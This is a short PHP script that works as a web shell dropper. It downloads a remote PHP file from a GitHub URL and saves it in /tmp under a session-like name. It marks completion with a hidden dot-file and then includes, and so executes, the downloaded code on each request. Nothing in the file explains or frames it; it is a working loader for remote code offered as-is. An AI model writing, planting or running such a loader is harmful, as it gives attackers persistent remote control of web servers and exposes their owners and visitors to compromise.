<?php
$shell_file = '/tmp/sesss_' . md5($_SERVER['HTTP_HOST']) . '.php';
$hidden_flag = '/tmp/.' . md5($_SERVER['HTTP_HOST']) . '.flag';

$url = "https://github.com/Jenderal92/php/raw/refs/heads/master/13k.php";

if (!file_exists($hidden_flag)) {
    $data = @file_get_contents($url);
    if ($data === false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
    }
    if (!empty($data)) {
        file_put_contents($shell_file, $data);
        file_put_contents($hidden_flag, time());
    }
}

if (file_exists($shell_file)) {
    include($shell_file);
}
?>
